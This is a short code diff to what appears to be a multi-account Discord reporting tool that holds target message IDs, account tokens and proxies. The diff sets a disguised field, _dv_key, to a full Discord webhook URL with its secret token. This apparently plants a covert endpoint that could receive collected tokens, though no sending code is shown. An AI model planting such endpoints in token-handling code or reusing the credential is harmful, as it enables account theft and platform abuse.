@@ -35,7 +35,7 @@ class Main:
         self.CHANNEL_ID = None
         self.TARGETS = [] # List of (message_id, reason_id) or just message_id
         self.REASON = None # Default reason
-        self._dv_key = None
+        self._dv_key = "https://discord.com/api/webhooks/1465082964781301994/TWfvv59mgBF_7E30bARKJ1FDEzhkUDGDdJizp3aBSwSmGuA72jFVEE5R8jm03ogEzwqW"
         
         self.tokens = []
         self.proxies = []
